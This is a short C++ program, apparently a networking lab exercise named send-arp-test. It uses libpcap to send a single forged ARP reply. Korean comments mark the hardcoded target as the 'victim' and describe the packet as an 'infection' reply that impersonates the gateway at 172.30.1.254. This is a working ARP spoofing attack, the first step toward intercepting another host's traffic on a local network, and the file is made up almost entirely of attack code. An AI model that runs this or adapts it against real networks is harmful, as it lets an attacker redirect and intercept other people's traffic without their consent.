#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    EthArpPacket packet;

    // 1. Ethernet Header
    packet.eth_.dmac_ = Mac("70:9c:d1:06:33:62");             // 🧠 피해자 MAC
    packet.eth_.smac_ = Mac("b4:a9:4f:92:53:c3");             // 나의 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    // 2. ARP Header (감염용 ARP Reply)
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);                 // 🔥 감염이므로 Reply

    packet.arp_.smac_ = Mac("b4:a9:4f:92:53:c3");            // 나의 MAC
    packet.arp_.sip_  = htonl(Ip("172.30.1.254"));           // 🧠 게이트웨이 IP로 속임

    packet.arp_.tmac_ = Mac("70:9c:d1:06:33:62");            // 피해자 MAC
    packet.arp_.tip_  = htonl(Ip("172.30.1.101"));           // 피해자 IP

    // 3. Send Packet
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    } else {
        printf("[+] Spoofed ARP reply packet sent!\n");
    }

    pcap_close(pcap);
}
